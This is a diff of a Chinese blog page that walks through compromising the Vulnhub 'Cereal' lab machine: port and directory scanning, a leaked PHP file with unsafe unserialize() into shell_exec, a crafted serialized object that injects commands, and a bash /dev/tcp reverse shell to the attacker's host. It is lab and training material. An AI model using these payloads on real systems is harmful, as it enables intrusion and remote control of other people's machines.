@@ -108,30 +108,12 @@
         <li><a class="icon" aria-label="下一篇" href="/2022/05/05/22%20Vulnhub%20Tomato%20Writeup/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
         
         <li><a class="icon" aria-label="返回顶部" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
-        <li><a class="icon" aria-label="分享文章" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
       </ul>
       <span id="i-prev" class="info" style="display:none;">上一篇</span>
       <span id="i-next" class="info" style="display:none;">下一篇</span>
       <span id="i-top" class="info" style="display:none;">返回顶部</span>
-      <span id="i-share" class="info" style="display:none;">分享文章</span>
     </span>
     <br/>
-    <div id="share" style="display: none">
-      <ul>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://hdfzzf.github.io/2022/05/05/21%20Vulnhub%20Cereal%20Writeup%20%E2%AD%90/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://hdfzzf.github.io/2022/05/05/21%20Vulnhub%20Cereal%20Writeup%20%E2%AD%90/&text=21 Vulnhub Cereal Writeup"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://hdfzzf.github.io/2022/05/05/21%20Vulnhub%20Cereal%20Writeup%20%E2%AD%90/&title=21 Vulnhub Cereal Writeup"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://hdfzzf.github.io/2022/05/05/21%20Vulnhub%20Cereal%20Writeup%20%E2%AD%90/&is_video=false&description=21 Vulnhub Cereal Writeup"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
-  <li><a class="icon" href="mailto:?subject=21 Vulnhub Cereal Writeup&body=Check out this article: https://hdfzzf.github.io/2022/05/05/21%20Vulnhub%20Cereal%20Writeup%20%E2%AD%90/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://hdfzzf.github.io/2022/05/05/21%20Vulnhub%20Cereal%20Writeup%20%E2%AD%90/&title=21 Vulnhub Cereal Writeup"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://hdfzzf.github.io/2022/05/05/21%20Vulnhub%20Cereal%20Writeup%20%E2%AD%90/&title=21 Vulnhub Cereal Writeup"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://hdfzzf.github.io/2022/05/05/21%20Vulnhub%20Cereal%20Writeup%20%E2%AD%90/&title=21 Vulnhub Cereal Writeup"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://hdfzzf.github.io/2022/05/05/21%20Vulnhub%20Cereal%20Writeup%20%E2%AD%90/&title=21 Vulnhub Cereal Writeup"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://hdfzzf.github.io/2022/05/05/21%20Vulnhub%20Cereal%20Writeup%20%E2%AD%90/&name=21 Vulnhub Cereal Writeup&description=&lt;p&gt;该靶机难度我认为很高，比较贴近真实场景，尤其是权限提升的时候，需要一定的耐心和细心。&lt;/p&gt;"><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
-  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://hdfzzf.github.io/2022/05/05/21%20Vulnhub%20Cereal%20Writeup%20%E2%AD%90/&t=21 Vulnhub Cereal Writeup"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
-</ul>
-
-    </div>
     <div id="toc">
       <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E6%9C%BA%E4%BF%A1%E6%81%AF"><span class="toc-number">1.</span> <span class="toc-text">1. 靶机信息</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">2. 渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E7%AB%AF%E5%8F%A3%E6%9C%8D%E5%8A%A1%E5%8F%91%E7%8E%B0"><span class="toc-number">2.1.</span> <span class="toc-text">2.1. 主机发现、端口扫描、端口服务发现</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%AE%BF%E9%97%AEhttp%E6%9C%8D%E5%8A%A1"><span class="toc-number">2.2.</span> <span class="toc-text">2.2. 访问http服务</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3"><span class="toc-number">2.2.1.</span> <span class="toc-text">2.2.1. 80端口</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3-1"><span class="toc-number">2.2.2.</span> <span class="toc-text">2.2.2. 44441端口</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#get-shell"><span class="toc-number">2.3.</span> <span class="toc-text">2.3. get shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87"><span class="toc-number">2.4.</span> <span class="toc-text">2.4. 权限提升</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#%E6%80%BB%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">3. 总结</span></a></li></ol>
     </div>
@@ -158,8 +140,6 @@
     <div class="postdate">
       
         <time datetime="2022-05-04T16:00:00.000Z" itemprop="datePublished">2022-05-05</time>
-        
-        (Updated: <time datetime="2022-06-07T03:50:30.362Z" itemprop="dateModified">2022-06-07</time>)
         
       
     </div>
@@ -217,37 +197,16 @@
 </ul>
 <h1 id="渗透">2. 渗透</h1>
 <h2 id="主机发现端口扫描端口服务发现">2.1. 主机发现、端口扫描、端口服务发现</h2>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">sudo</span> arp-scan -l
-<span class="token function">sudo</span> nmap -p- <span class="token number">10.0</span>.2.25
-<span class="token function">sudo</span> nmap -p21,22,80,139,445,3306,11111,22222,22223,33333,44441,44444,55551,55555 -A <span class="token number">10.0</span>.2.25<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
-<p>该靶机开放的端口很多。信息如下： <pre class="line-numbers language-none"><code class="language-none">PORT      STATE SERVICE
-21&#x2F;tcp    open  ftp
-22&#x2F;tcp    open  ssh
-80&#x2F;tcp    open  http
-139&#x2F;tcp   open  netbios-ssn
-445&#x2F;tcp   open  microsoft-ds
-3306&#x2F;tcp  open  mysql
-11111&#x2F;tcp open  vce
-22222&#x2F;tcp open  easyengine
-22223&#x2F;tcp open  unknown
-33333&#x2F;tcp open  dgi-serv
-33334&#x2F;tcp open  speedtrace
-44441&#x2F;tcp open  unknown
-44444&#x2F;tcp open  cognex-dataman
-55551&#x2F;tcp open  unknown
-55555&#x2F;tcp open  unknown<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.25</span><br><span class="line">sudo nmap -p21,22,80,139,445,3306,11111,22222,22223,33333,44441,44444,55551,55555 -A 10.0.2.25</span><br></pre></td></tr></table></figure>
+<p>该靶机开放的端口很多。信息如下： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PORT      STATE SERVICE</span><br><span class="line">21/tcp    open  ftp</span><br><span class="line">22/tcp    open  ssh</span><br><span class="line">80/tcp    open  http</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">3306/tcp  open  mysql</span><br><span class="line">11111/tcp open  vce</span><br><span class="line">22222/tcp open  easyengine</span><br><span class="line">22223/tcp open  unknown</span><br><span class="line">33333/tcp open  dgi-serv</span><br><span class="line">33334/tcp open  speedtrace</span><br><span class="line">44441/tcp open  unknown</span><br><span class="line">44444/tcp open  cognex-dataman</span><br><span class="line">55551/tcp open  unknown</span><br><span class="line">55555/tcp open  unknown</span><br></pre></td></tr></table></figure></p>
 <p>可以一一对各个端口的服务进行查看。</p>
-<p>首先查看21端口，利用-A参数知道可以匿名登录，因此使用下面命令连接 <pre class="line-numbers language-none"><code class="language-none">1. ftp 10.0.2.25
-2. Anonymous
-3. 密码为空，直接回车<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
-<p>只有一个pub目录，并且该目录为空，尝试上传文件也失败了 <pre class="line-numbers language-ftp>" data-language="ftp>"><div class="caption"><span>put hello.txt</span></div><code class="language-ftp>">local: hello.txt remote: hello.txt
-229 Entering Extended Passive Mode (|||56531|)
-550 Permission denied.<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></p>
+<p>首先查看21端口，利用-A参数知道可以匿名登录，因此使用下面命令连接 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. ftp 10.0.2.25</span><br><span class="line">2. Anonymous</span><br><span class="line">3. 密码为空，直接回车</span><br></pre></td></tr></table></figure></p>
+<p>只有一个pub目录，并且该目录为空，尝试上传文件也失败了 <figure class="highlight plaintext"><figcaption><span>put hello.txt</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">local: hello.txt remote: hello.txt</span><br><span class="line">229 Entering Extended Passive Mode (|||56531|)</span><br><span class="line">550 Permission denied.</span><br></pre></td></tr></table></figure></p>
 <p>因此尝试其他端口。</p>
 <p>其中139和445端口上的服务可能是mssql，经查看没有可利用的地方；3306禁止kali的ip连接，可能没有开启外连；44441和80端口的服务都是http，其他端口虽然开放，也可以用nc连接的上，但是无论输入任何命令，服务器都不会有响应，因此，这些端口可能只是一个幌子，还有可能是蜜罐。</p>
 <h2 id="访问http服务">2.2. 访问http服务</h2>
 <h3 id="端口">2.2.1. 80端口</h3>
-<p>直接访问，发现这就是apache的一个默认界面，但是，知道了靶机的操作系统为Rocky Linux。接着查看源码、抓包都没有什么有用的信息，因此直接进行目录扫描。 <pre class="line-numbers language-none"><code class="language-none">gobuster dir -u http:&#x2F;&#x2F;10.0.2.25 -w &#x2F;usr&#x2F;share&#x2F;dirb&#x2F;wordlists&#x2F;common.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>直接访问，发现这就是apache的一个默认界面，但是，知道了靶机的操作系统为Rocky Linux。接着查看源码、抓包都没有什么有用的信息，因此直接进行目录扫描。 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://10.0.2.25 -w /usr/share/dirb/wordlists/common.txt</span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505095018.png" /></p>
 <p>注意到两个可以的目录: admin, blog。</p>
 <p>首先是admin，这是一个登录界面，可以尝试对其进行爆破，但是最终一无所获。对其再次进行路径扫描，并没有发现有用的信息。</p>
@@ -259,58 +218,23 @@
 </ol>
 <p>尝试对搜索框进行测试，并没有漏洞。对blog进行路径扫描，会发现许多文件，但一一查看之后，并没有可以利用的。在测试过程中，发现许多的功能都转到了cereal.ctf下，因此尝试将其加入到/etc/hosts之后再次进行尝试，还是一无所获。</p>
 <h3 id="端口-1">2.2.2. 44441端口</h3>
-<p>页面非常简单，就一句话 "Coming soon..."，因此对该目录进行路径扫描 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gobuster <span class="token function">dir</span> -u http://10.0.2.25:44441/ -w /usr/share/dirb/wordlists/common.txt <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
-<p>没有找到任何有用的信息，如果使用域名呢？ <pre class="line-numbers language-none"><code class="language-none">gobuster dir -u http:&#x2F;&#x2F;cereal.ctf:44441&#x2F; -w &#x2F;usr&#x2F;share&#x2F;dirb&#x2F;wordlists&#x2F;common.txt <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
-<p>与上面的一样，没有任何有用的信息。联想到，既然靶机给了我们一个域名，那是不是存在子域名？因此尝试扫描一下是否有子域名： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gobuster vhost -u http://cereal.ctf:44441/ -t <span class="token number">20</span> -w /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt<span class="token operator">|</span><span class="token function">grep</span> <span class="token string">"Status: 200"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>页面非常简单，就一句话 "Coming soon..."，因此对该目录进行路径扫描 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://10.0.2.25:44441/ -w /usr/share/dirb/wordlists/common.txt </span><br></pre></td></tr></table></figure></p>
+<p>没有找到任何有用的信息，如果使用域名呢？ <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster dir -u http://cereal.ctf:44441/ -w /usr/share/dirb/wordlists/common.txt </span><br></pre></td></tr></table></figure></p>
+<p>与上面的一样，没有任何有用的信息。联想到，既然靶机给了我们一个域名，那是不是存在子域名？因此尝试扫描一下是否有子域名： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gobuster vhost -u http://cereal.ctf:44441/ -t 20 -w /usr/share/seclists/Discovery/DNS/fierce-hostlist.txt|grep <span class="string">&quot;Status: 200&quot;</span></span><br></pre></td></tr></table></figure></p>
 <p>得到一个 secure.cereal.ctf 子域名，将其添加到hosts中，然后访问</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505102057.png" /></p>
 <p>终于得到一个功能点，这看起来像是执行了系统命令ping，因此后台可能存在着命令执行的漏洞，但是输入<code>127.0.0.1;ls</code>时，结果是空白，应该是做了一定的过滤。</p>
 <p>对其进行路径扫描，得到一个/php，直接访问它，发现了一个值得怀疑的点，那就是该文件第一行就是定义了一个序列化的函数。我们抓包查看一下我们点击ping时的数据</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505102517.png" /></p>
-<p>经过url decode，原来真的是经过了序列化之后的数据。反序列化的漏洞很难在黑盒的情况下进行利用，所以我们需要找到源码，联想到刚刚有一个备份文件没有找到,这里换一个工具进行扫描，gobuster我没扫出来： <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://secure.cereal.ctf:44441/FUZZ <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
-<p>扫描出一个 back_en 目录，该目录不让直接访问，扫描一下该目录下是是否存在备份文件 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch -u http://secure.cereal.ctf:44441/back_en<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
-<p>（感觉扫常规的目录和文件，dirsearch更快）扫出一个index.php.bak，直接访问查看源码，得到如下php代码： <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">class</span> <span class="token class-name-definition class-name">pingTest</span> <span class="token punctuation">&#123;</span>
-	<span class="token keyword">public</span> <span class="token variable">$ipAddress</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"127.0.0.1"</span><span class="token punctuation">;</span>
-	<span class="token keyword">public</span> <span class="token variable">$isValid</span> <span class="token operator">=</span> <span class="token constant boolean">False</span><span class="token punctuation">;</span>
-	<span class="token keyword">public</span> <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
-	<span class="token keyword">function</span> <span class="token function-definition function">validate</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isValid</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-			<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">ipAddress</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_IP</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
-			<span class="token punctuation">&#123;</span>
-				<span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isValid</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>
-			<span class="token punctuation">&#125;</span>
-		<span class="token punctuation">&#125;</span>
-		<span class="token variable">$this</span><span class="token operator">-></span><span class="token function">ping</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-	<span class="token punctuation">&#125;</span>
-	<span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function-definition function">ping</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
-        <span class="token punctuation">&#123;</span>
-		<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">isValid</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-			<span class="token variable">$this</span><span class="token operator">-></span><span class="token property">output</span> <span class="token operator">=</span> <span class="token function">shell_exec</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"ping -c 3 <span class="token interpolation"><span class="token variable">$this</span><span class="token operator">-></span><span class="token property">ipAddress</span></span>"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>	
-		<span class="token punctuation">&#125;</span>
-        <span class="token punctuation">&#125;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'obj'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
-	<span class="token variable">$pingTest</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token function">urldecode</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'obj'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
-	<span class="token variable">$pingTest</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">pingTest</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-<span class="token variable">$pingTest</span><span class="token operator">-></span><span class="token function">validate</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>经过url decode，原来真的是经过了序列化之后的数据。反序列化的漏洞很难在黑盒的情况下进行利用，所以我们需要找到源码，联想到刚刚有一个备份文件没有找到,这里换一个工具进行扫描，gobuster我没扫出来： <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ffuf -c -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-big.txt -u http://secure.cereal.ctf:44441/FUZZ </span><br></pre></td></tr></table></figure></p>
+<p>扫描出一个 back_en 目录，该目录不让直接访问，扫描一下该目录下是是否存在备份文件 <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dirsearch -u http://secure.cereal.ctf:44441/back_en</span><br></pre></td></tr></table></figure></p>
+<p>（感觉扫常规的目录和文件，dirsearch更快）扫出一个index.php.bak，直接访问查看源码，得到如下php代码： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pingTest</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$ipAddress</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$isValid</span> = <span class="literal">False</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$output</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">	<span class="function"><span class="keyword">function</span> <span class="title">validate</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (!<span class="keyword">$this</span>-&gt;isValid) &#123;</span><br><span class="line">			<span class="keyword">if</span> (filter_var(<span class="keyword">$this</span>-&gt;ipAddress, FILTER_VALIDATE_IP))</span><br><span class="line">			&#123;</span><br><span class="line">				<span class="keyword">$this</span>-&gt;isValid = <span class="literal">True</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;ping();</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">ping</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">		<span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isValid) &#123;</span><br><span class="line">			<span class="keyword">$this</span>-&gt;output = shell_exec(<span class="string">&quot;ping -c 3 <span class="subst">$this</span>-&gt;ipAddress&quot;</span>);	</span><br><span class="line">		&#125;</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;obj&#x27;</span>])) &#123;</span><br><span class="line">	<span class="variable">$pingTest</span> = unserialize(urldecode(<span class="variable">$_POST</span>[<span class="string">&#x27;obj&#x27;</span>]));</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">	<span class="variable">$pingTest</span> = <span class="keyword">new</span> pingTest;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$pingTest</span>-&gt;validate();</span><br></pre></td></tr></table></figure></p>
 <h2 id="get-shell">2.3. get shell</h2>
-<p>通过代码审计可以得知，如果输入127.0.0.1;ls，那么无法通过validate()的过滤，但是只要 isValid 为True就可以直接绕过过滤函数，因此构造方法也很简单： <pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
-<span class="token keyword">class</span> <span class="token class-name-definition class-name">pingTest</span> <span class="token punctuation">&#123;</span>
-	<span class="token keyword">public</span> <span class="token variable">$ipAddress</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"127.0.0.1;id"</span><span class="token punctuation">;</span>
-	<span class="token keyword">public</span> <span class="token variable">$isValid</span> <span class="token operator">=</span> <span class="token constant boolean">True</span><span class="token punctuation">;</span>
-	<span class="token keyword">public</span> <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token string double-quoted-string">""</span><span class="token punctuation">;</span>
-<span class="token punctuation">&#125;</span>
-
-<span class="token variable">$obj</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">pingTest</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$obj</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
-<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></p>
+<p>通过代码审计可以得知，如果输入127.0.0.1;ls，那么无法通过validate()的过滤，但是只要 isValid 为True就可以直接绕过过滤函数，因此构造方法也很简单： <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">pingTest</span> </span>&#123;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$ipAddress</span> = <span class="string">&quot;127.0.0.1;id&quot;</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$isValid</span> = <span class="literal">True</span>;</span><br><span class="line">	<span class="keyword">public</span> <span class="variable">$output</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$obj</span> = <span class="keyword">new</span> pingTest();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize(<span class="variable">$obj</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure></p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505105448.png" /></p>
 <p>命令被成功执行。然后我使用了which nc，发现没有回显，还以为没有nc，但是 nc 10.0.2.4 3333 时却可以连接到我的主机，所以其实是有nc的，直接通过nc反弹shell。</p>
 <p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220505105659.png" /></p>
-<p>还可以通过下面的命令： <pre class="line-numbers language-none"><code class="language-none">127.0.0.1|bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.0.2.4&#x2F;4444 0&gt;&amp;1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
+<p>还可以通过下面的命令： <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">127.0.0.1|bash -i &gt;&amp; /dev/tcp/10.0.2.4/4444 0&gt;&amp;1</span><br></pre></td></tr></table></figure></p>
 <p>重点在后半句，解释如下：</p>
 <table>
 <thead>
@@ -346,17 +270,12 @@
 <li><a target="_blank" rel="noopener" href="https://github.com/DominicBreuker/pspy">GitHub - DominicBreuker/pspy: Monitor linux processes without root permissions</a></li>
 </ul>
 <p>先在kali下载，然后通过nc传到靶机，并给予执行权限</p>
-<pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./pspy<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>注意到有这么一行： <pre class="line-numbers language-none"><code class="language-none">CMD: UID&#x3D;0    PID&#x3D;24316  | &#x2F;bin&#x2F;bash &#x2F;usr&#x2F;share&#x2F;scripts&#x2F;chown.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></p>
-<p>该脚本由root运行，并且看这名字像是更改属主的脚本，通过 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">ls</span> -l /usr/share/scripts/chown.sh
--rw-r--r--. <span class="token number">1</span> root root <span class="token number">45</span> May <span class="token number">29</span>  <span class="token number">2021</span> /usr/share/scripts/chown.sh<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></p>
-<p>发现我们拥有读的权限。 <pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">cat</span> /usr/share/scripts/chown.sh
-
